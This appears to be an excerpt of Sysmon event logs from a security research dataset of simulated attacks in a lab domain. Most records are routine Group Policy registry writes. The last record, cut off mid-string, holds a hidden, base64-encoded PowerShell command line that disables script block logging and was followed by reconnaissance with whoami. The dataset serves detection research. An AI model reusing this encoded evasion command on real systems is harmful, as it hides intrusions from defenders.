{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.580Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0\\szName\r\nDetails: THESHIRE\\MORDORDC$","SourceModuleName":"eventlog","ProcessId":"1696","Details":"THESHIRE\\MORDORDC$","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0\\szName","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757075,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.582Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757076,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.582Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757077,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.582Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757078,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.582Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0\\szTargetName\r\nDetails: MORDORDC","SourceModuleName":"eventlog","ProcessId":"1696","Details":"MORDORDC","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\0\\szTargetName","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757079,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.583Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.545\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\ServiceInstances","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.545","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\ServiceInstances","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757080,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.584Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\NextRefreshMode\r\nDetails: DWORD (0x00000001)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x00000001)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\NextRefreshMode","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757081,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.584Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\NextRefreshReason\r\nDetails: DWORD (0x00000007)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x00000007)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\NextRefreshReason","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757082,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.585Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\LastExtensionMadeSyncRequest\r\nDetails: {00000000-0000-0000-0000-000000000000}","SourceModuleName":"eventlog","ProcessId":"1696","Details":"{00000000-0000-0000-0000-000000000000}","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\LastExtensionMadeSyncRequest","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757083,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.585Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757084,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.587Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757085,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.587Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757086,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.587Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\StartTimeLo\r\nDetails: DWORD (0x9e504fd7)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x9e504fd7)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\StartTimeLo","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757087,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.588Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\StartTimeHi\r\nDetails: DWORD (0x01d66cc7)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x01d66cc7)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\StartTimeHi","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757088,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.588Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\EndTimeLo\r\nDetails: DWORD (0x9e6364a5)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x9e6364a5)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\EndTimeLo","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757089,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.589Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\EndTimeHi\r\nDetails: DWORD (0x01d66cc7)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x01d66cc7)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\EndTimeHi","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757090,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"@version":"1","EventType":"INFO","AccountType":"User","ThreadID":4364,"Channel":"Microsoft-Windows-Sysmon/Operational","OpcodeValue":0,"OriginalFileName":"whoami.exe","Hostname":"WORKSTATION5.theshire.local","@timestamp":"2020-08-07T14:32:47.591Z","ParentCommandLine":"\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBu